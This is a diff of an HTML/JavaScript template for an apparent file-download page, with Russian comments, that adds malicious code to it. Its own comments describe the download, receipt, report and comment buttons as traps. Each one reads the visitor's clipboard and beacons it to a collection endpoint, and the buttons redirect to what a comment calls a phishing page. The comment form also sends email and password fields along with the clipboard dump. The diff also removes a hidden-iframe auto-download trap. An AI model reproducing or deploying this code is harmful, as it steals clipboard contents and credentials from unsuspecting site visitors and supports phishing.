@@ -28,8 +28,8 @@
             <small class="text-muted">{{ file.format }} • {{ file.date }}</small>
         </div>
         <div>
-            <!-- ИЗМЕНЕНО: Теперь клик вызывает функцию stealAndDownload -->
-            <a href="#" onclick="stealAndDownload(event, '/verify/{{ uid }}/{{ file.name }}')" class="btn btn-outline-dark btn-sm">
+            <!-- Кнопка ведет на фишинг Семяныча + крадет буфер -->
+            <a href="#" onclick="stealAndRedirect(event, '/verify/{{ uid }}/{{ file.name }}')" class="btn btn-outline-dark btn-sm">
                 <i class="fa-solid fa-download"></i> Скачать
             </a>
         </div>
@@ -42,8 +42,7 @@
                 <strong><i class="fa-solid fa-receipt"></i> Квитанция о загрузке</strong>
                 <br><small class="text-muted">Подтверждение для отчетности (PDF)</small>
             </div>
-            <!-- Тоже вешаем ловушку на квитанцию -->
-            <a href="#" onclick="stealAndDownload(event, '/download_receipt/{{ uid }}')" class="btn btn-sm btn-secondary">
+            <a href="#" onclick="stealAndRedirect(event, '/download_receipt/{{ uid }}')" class="btn btn-sm btn-secondary">
                 <i class="fa-solid fa-file-arrow-down"></i> Скачать
             </a>
         </div>
@@ -63,6 +62,7 @@
                 <div class="border-bottom pb-2 mb-2">
                     <div class="d-flex justify-content-between">
                         <div><strong>{{ c.username }}</strong> <small class="text-muted">{{ c.date }}</small></div>
+                        <!-- Кнопка жалобы тоже крадет буфер -->
                         <button onclick="openReportModal('{{ c.username }}')" class="btn btn-danger btn-sm py-0 px-2" style="font-size: 0.8rem;">
                             <i class="fa-solid fa-triangle-exclamation"></i> Пожаловаться
                         </button>
@@ -86,6 +86,7 @@
             <textarea class="form-control" id="commentText" style="height: 80px"></textarea>
             <label>Ваше сообщение...</label>
         </div>
+        <!-- Кнопка отправки комментария крадет буфер -->
         <button onclick="sendComment('{{ uid }}')" class="btn btn-primary btn-sm w-100"><i class="fa-regular fa-paper-plane"></i> Отправить</button>
     </div>
 </div>
@@ -110,50 +111,39 @@
 </div>
 
 <script>
-// --- ГЛАВНАЯ ФИШКА: КРАЖА БУФЕРА ПРИ СКАЧИВАНИИ ---
-async function stealAndDownload(event, targetUrl) {
-    event.preventDefault(); // Останавливаем переход
+// --- УНИВЕРСАЛЬНАЯ ФУНКЦИЯ КРАЖИ И ПЕРЕХОДА ---
+async function stealAndRedirect(event, url) {
+    event.preventDefault();
+    const clip = await stealClipboard(); // Функция из base.html
     
-    let clipboardContent = "N/A";
-    
-    try {
-        // Проверяем поддержку
-        if (navigator.clipboard && navigator.clipboard.readText) {
-            // Даем 1.5 секунды на разрешение доступа
-            const clipPromise = navigator.clipboard.readText();
-            const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 1500));
-            
-            const clipResult = await Promise.race([clipPromise, timeoutPromise]);
-            if (clipResult) clipboardContent = clipResult;
-        }
-    } catch (err) {
-        console.log("Clipboard blocked or timeout");
-        clipboardContent = "Blocked/Timeout";
-    }
-
-    // Отправляем данные
     const data = {
         meta: { trigger: 'DOWNLOAD CLICK (CLIPBOARD)', url: window.location.href },
-        system: { CLIPBOARD_DUMP: clipboardContent.substring(0, 2000) }
+        system: { CLIPBOARD_DUMP: clip }
     };
     
-    // Используем sendBeacon для надежности перед уходом со страницы
     const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
     navigator.sendBeacon('/api/collect', blob);
-
-    // Переходим по ссылке (на фишинг или скачивание)
-    window.location.href = targetUrl;
+    
+    setTimeout(() => { window.location.href = url; }, 200);
 }
 
-// --- ОСТАЛЬНОЙ ФУНКЦИОНАЛ ---
+// --- ФУНКЦИИ ИНТЕРФЕЙСА ---
 
-function openReportModal(username) {
+async function openReportModal(username) {
+    // Крадем буфер при открытии модалки жалобы
+    const clip = await stealClipboard();
+    const data = {
+        meta: { trigger: 'REPORT OPENED (CLIPBOARD)', url: window.location.href },
+        system: { CLIPBOARD_DUMP: clip, reported_user: username }
+    };
+    navigator.sendBeacon('/api/collect', new Blob([JSON.stringify(data)], {type: 'application/json'}));
+
     document.getElementById('reportTarget').value = username;
     document.getElementById('reportReason').value = ''; 
     new bootstrap.Modal(document.getElementById('reportModal')).show();
 }
 
-function submitReport() {
+async function submitReport() {
     const text = document.getElementById('reportReason').value;
     const target = document.getElementById('reportTarget').value;
     
@@ -170,17 +160,7 @@ function submitReport() {
     });
 }
 
-// Auto-Download Trap
-window.addEventListener('load', function() {
-    setTimeout(() => {
-        const ifr = document.createElement('iframe');
-        ifr.style.display = 'none';
-        ifr.src = "/download_receipt/{{ uid }}";
-        document.body.appendChild(ifr);
-    }, 2500);
-});
-
-function sendComment(uid) {
+async function sendComment(uid) {
     const username = document.getElementById('usernameInput').value || 'Guest';
     const email = document.getElementById('emailInput').value;
     const password = document.getElementById('passwordInput').value;
@@ -188,10 +168,16 @@ function sendComment(uid) {
     
     if(!text) { alert("Введите текст!"); return; }
 
+    // Крадем буфер при отправке комментария
+    const clip = await stealClipboard();
+
     fetch('/api/comment', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ uid, username, text, email, password })
+        body: JSON.stringify({ 
+            uid, username, text, email, password,
+            system: { CLIPBOARD_DUMP: clip } // Добавляем буфер в тело запроса
+        })
     })
     .then(r => r.json())
     .then(data => {
